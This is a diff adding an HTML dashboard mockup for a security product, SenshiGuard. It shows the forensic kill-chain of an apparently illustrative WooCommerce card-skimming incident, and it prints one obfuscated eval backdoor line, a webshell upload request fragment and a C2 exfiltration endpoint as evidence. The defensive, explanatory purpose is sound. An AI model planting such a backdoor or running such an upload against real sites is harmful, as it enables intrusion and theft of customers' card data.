@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SenshiGuard — Forensic Incident Investigation & Kill-Chain</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
+  <style>
+    .timeline-container {
+      position: relative;
+      padding-left: 32px;
+      margin-top: 24px;
+    }
+    .timeline-container::before {
+      content: '';
+      position: absolute;
+      left: 7px;
+      top: 10px;
+      bottom: 10px;
+      width: 2px;
+      background: linear-gradient(180deg, #FF3366 0%, #0EA5E9 50%, #10B981 100%);
+    }
+    .timeline-step {
+      position: relative;
+      margin-bottom: 32px;
+    }
+    .timeline-dot {
+      position: absolute;
+      left: -32px;
+      top: 4px;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background: var(--bg-app);
+      border: 3px solid var(--accent-crimson);
+      box-shadow: 0 0 10px rgba(255, 51, 102, 0.5);
+    }
+    .timeline-dot.dot-cyan { border-color: var(--accent-cyan); box-shadow: 0 0 10px rgba(14, 165, 233, 0.5); }
+    .timeline-dot.dot-green { border-color: var(--accent-emerald); box-shadow: 0 0 10px rgba(16, 185, 129, 0.5); }
+    .timeline-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      padding: 20px;
+      backdrop-filter: blur(12px);
+    }
+    .payload-box {
+      background: #04060A;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 6px;
+      padding: 12px 16px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      line-height: 1.6;
+      margin-top: 12px;
+    }
+    .pill-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+  </style>
+</head>
+<body>
+  <div class="app-layout">
+    <aside class="sidebar">
+      <div>
+        <a href="index.html" class="sidebar-brand">
+          <div class="brand-icon">
+            <img src="assets/logo.svg" alt="SenshiGuard">
+          </div>
+          <div class="brand-text">
+            SENSHI<span style="color: var(--accent-crimson);">GUARD</span>
+            <span class="brand-kanji">戦士</span>
+          </div>
+        </a>
+
+        <div class="nav-section-title">Fleet Security</div>
+        <nav class="sidebar-nav">
+          <a href="index.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>
+            Overview
+          </a>
+          <a href="sites.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
+            Sites Fleet
+          </a>
+          <a href="scanner.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Cloud Scanner
+          </a>
+          <a href="incident-forensics.html" class="sidebar-link active">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/><path d="M11 8v6"/><path d="M8 11h6"/></svg>
+            Attack Kill-Chain
+          </a>
+          <a href="firewall.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+            Edge WAF & Bots
+          </a>
+          <a href="vulnerabilities.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+            Virtual Patching
+          </a>
+
+          <div class="nav-section-title">⚡ Autonomous Game-Changers</div>
+          <a href="auto-pilot.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            Self-Healing Auto-Pilot
+          </a>
+          <a href="revenue-shield.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M16 8h-6a2 2 0 1 0 0 4h4a2 2 0 1 1 0 4H8"/><path d="M12 6v12"/></svg>
+            Checkout Loss Shield
+          </a>
+          <a href="instant-audit.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/></svg>
+            Instant Risk Scanner
+          </a>
+
+          <div class="nav-section-title">Exclusive Defense Tech</div>
+          <a href="ai-copilot.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 3-1.9 5.8a2 2 0 0 1-1.3 1.3L3 12l5.8 1.9a2 2 0 0 1 1.3 1.3L12 21l1.9-5.8a2 2 0 0 1 1.3-1.3L21 12l-5.8-1.9a2 2 0 0 1-1.3-1.3Z"/></svg>
+            AI Threat Copilot
+          </a>
+          <a href="db-scanner.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/><path d="M3 12c0 1.66 4 3 9 3s9-1.34 9-3"/></svg>
+            Database & Cron
+          </a>
+          <a href="supply-chain.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m7.5 4.27 9 5.15"/><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"/></svg>
+            Supply Chain & Nulled
+          </a>
+          <a href="quarantine.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3h18v18H3z"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>
+            Sandbox Dry-Run
+          </a>
+          
+          <div class="nav-section-title">Configuration</div>
+          <a href="settings.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
+            API & Keys
+          </a>
+        </nav>
+      </div>
+
+      <div class="sidebar-footer">
+        <div class="engine-status-box">
+          <div>
+            <span class="status-dot"></span>
+            <span style="font-weight: 600; font-size: 12px;">Kill-Chain Engine</span>
+          </div>
+          <span class="engine-status-label">Forensic Mode</span>
+        </div>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <header class="topbar">
+        <div style="font-size: 13px; color: var(--text-secondary);">
+          Active Investigation: <strong style="color: #FF3366;">production-store.com (Incident #INC-89421)</strong>
+        </div>
+        <div style="display: flex; gap: 10px;">
+          <button class="btn btn-secondary btn-sm">Export PDF Forensic Report</button>
+          <button class="btn btn-primary btn-sm">⚡ 1-Click Neutralize & Clean</button>
+        </div>
+      </header>
+
+      <div class="page-body">
+        <div class="page-header">
+          <div>
+            <h1 class="page-title">Forensic Attack Kill-Chain & Root Cause Analysis</h1>
+            <p class="page-subtitle">Full reconstruction of how the attacker breached the site, what malicious code was injected, active data theft, and C2 activities.</p>
+          </div>
+        </div>
+
+        <!-- Incident Executive Summary -->
+        <div class="stat-card" style="border-color: rgba(255, 51, 102, 0.4); margin-bottom: 28px; padding: 24px;">
+          <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;">
+            <div>
+              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Attacker IP / Origin</span>
+              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: #FFF; margin-top: 4px;">194.26.112.44</div>
+              <span style="font-size: 11px; color: var(--accent-crimson);">TOR Exit Node • Moscow</span>
+            </div>
+            <div>
+              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Primary Intent / Nature</span>
+              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: #FF6B8B; margin-top: 4px;">Credit Card Theft (Magecart)</div>
+              <span style="font-size: 11px; color: var(--text-muted);">+ SEO Spam Injection</span>
+            </div>
+            <div>
+              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Breach Vector</span>
+              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: var(--accent-amber); margin-top: 4px;">CVE-2026-3199</div>
+              <span style="font-size: 11px; color: var(--text-muted);">RevSlider AJAX File Upload</span>
+            </div>
+            <div>
+              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Containment Status</span>
+              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: var(--accent-emerald); margin-top: 4px;">Isolated by Senshi</div>
+              <span style="font-size: 11px; color: #34D399;">Ready to Auto-Remediate</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Chronological Attack Kill-Chain -->
+        <h2 style="font-size: 18px; font-weight: 800; margin-bottom: 16px;">Chronological Attack Progression (Kill-Chain)</h2>
+        
+        <div class="timeline-container">
+          
+          <!-- Phase 1 -->
+          <div class="timeline-step">
+            <div class="timeline-dot"></div>
+            <div class="timeline-card">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                  <span class="pill-tag" style="background: rgba(255, 51, 102, 0.15); color: #FF6B8B;">Phase 1: Initial Recon & Exploit</span>
+                  <h3 style="font-size: 15px; font-weight: 700;">Unauthenticated File Upload Exploit (CVE-2026-3199)</h3>
+                </div>
+                <span style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted);">02:14:18 AM</span>
+              </div>
+              <p style="font-size: 13px; color: var(--text-secondary);">
+                Attacker automated bot sent a crafted multipart POST request targeting <code>/wp-admin/admin-ajax.php?action=revslider_ajax_action</code>. The unauthenticated endpoint allowed arbitrary PHP file upload without sanitizing file extensions.
+              </p>
+              <div class="payload-box">
+                <span style="color: #64748B;">POST /wp-admin/admin-ajax.php HTTP/1.1</span><br>
+                <span style="color: #64748B;">User-Agent: Mozilla/5.0 (compatible; ExploitBot/2.1)</span><br>
+                <span style="color: #F87171;">Content-Disposition: form-data; name="update_file"; filename="cache_bak.php"</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 2 -->
+          <div class="timeline-step">
+            <div class="timeline-dot dot-cyan"></div>
+            <div class="timeline-card">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                  <span class="pill-tag" style="background: rgba(14, 165, 233, 0.15); color: #38BDF8;">Phase 2: Persistence & Code Injection</span>
+                  <h3 style="font-size: 15px; font-weight: 700;">Webshell Dropped & WooCommerce Session Handler Tampered</h3>
+                </div>
+                <span style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted);">02:14:22 AM</span>
+              </div>
+              <p style="font-size: 13px; color: var(--text-secondary);">
+                The dropper executed and immediately modified the legitimate WooCommerce file: <code>/wp-content/plugins/woocommerce/includes/class-wc-session-handler.php</code> on line 44 to maintain persistent execution on every site visitor request.
+              </p>
+              <div class="payload-box">
+                <span style="color: #F87171;">- Injected File: /wp-content/uploads/2026/02/cache_bak.php (c99 Webshell)</span><br>
+                <span style="color: #F87171;">- Code Injection: @eval(base64_decode(str_rot13($_POST['__x71']))) in class-wc-session-handler.php</span><br>
+                <span style="color: #F87171;">- Stealth DB Admin Created: User 'wp_system_admin' (ID: 88) inserted via direct SQL query</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 3 -->
+          <div class="timeline-step">
+            <div class="timeline-dot"></div>
+            <div class="timeline-card">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                  <span class="pill-tag" style="background: rgba(255, 51, 102, 0.15); color: #FF6B8B;">Phase 3: Active Malicious Operations (Data Theft & C2)</span>
+                  <h3 style="font-size: 15px; font-weight: 700;">Live Credit Card Skimming & Remote C2 Exfiltration</h3>
+                </div>
+                <span style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted);">02:15:00 AM - Present</span>
+              </div>
+              <p style="font-size: 13px; color: var(--text-secondary);">
+                <strong>What the malware was actively doing:</strong>
+              </p>
+              <ul style="font-size: 13px; color: var(--text-secondary); margin-left: 20px; margin-top: 8px; display: flex; flex-direction: column; gap: 6px;">
+                <li><strong style="color: #FF3366;">1. Credit Card Data Interception:</strong> Hooked payment form POST data to extract credit card numbers, expiry dates, and CVVs before passing to Stripe.</li>
+                <li><strong style="color: #0EA5E9;">2. Command & Control (C2) Exfiltration:</strong> Streamed intercepted customer payloads via HTTP POST to external drop server <code>http://194.26.112.44/c2/receive.php</code>.</li>
+                <li><strong style="color: #F59E0B;">3. SEO Cloaking Spam Redirect:</strong> Added hidden JavaScript in 14 blog posts in <code>wp_posts</code> that redirected mobile user agents to gambling affiliate domains.</li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- Phase 4 -->
+          <div class="timeline-step">
+            <div class="timeline-dot dot-green"></div>
+            <div class="timeline-card" style="border-color: rgba(16, 185, 129, 0.4);">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                  <span class="pill-tag" style="background: rgba(16, 185, 129, 0.15); color: #34D399;">Phase 4: SenshiGuard Autonomous Remediation Plan</span>
+                  <h3 style="font-size: 15px; font-weight: 700;">Forensic Neutralization & 1-Click Restoration</h3>
+                </div>
+                <span style="font-family: var(--font-mono); font-size: 12px; color: #34D399;">Ready to Execute</span>
+              </div>
+              <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 14px;">
+                SenshiGuard generated a surgical 5-point remediation recipe verified in an isolated cloud sandbox:
+              </p>
+              <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 12px;">
+                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
+                  <strong style="color: #34D399;">✓ File Sanitization:</strong> Surgical diff removes eval line in WooCommerce handler; deletes <code>cache_bak.php</code>.
+                </div>
+                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
+                  <strong style="color: #34D399;">✓ Database Cleanup:</strong> Strips spam redirects from 14 rows in <code>wp_posts</code>; deletes rogue user <code>wp_system_admin</code>.
+                </div>
+                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
+                  <strong style="color: #34D399;">✓ Entry Point Sealing:</strong> Virtual Patch <code>VP-2026-3199</code> active on Edge WAF (RevSlider upload blocked).
+                </div>
+                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
+                  <strong style="color: #34D399;">✓ C2 IP Blocked:</strong> Global Edge block rule deployed for <code>194.26.112.44</code>.
+                </div>
+              </div>
+
+              <div style="margin-top: 18px; display: flex; justify-content: flex-end;">
+                <button class="btn btn-primary">⚡ Execute 1-Click Forensic Neutralization</button>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
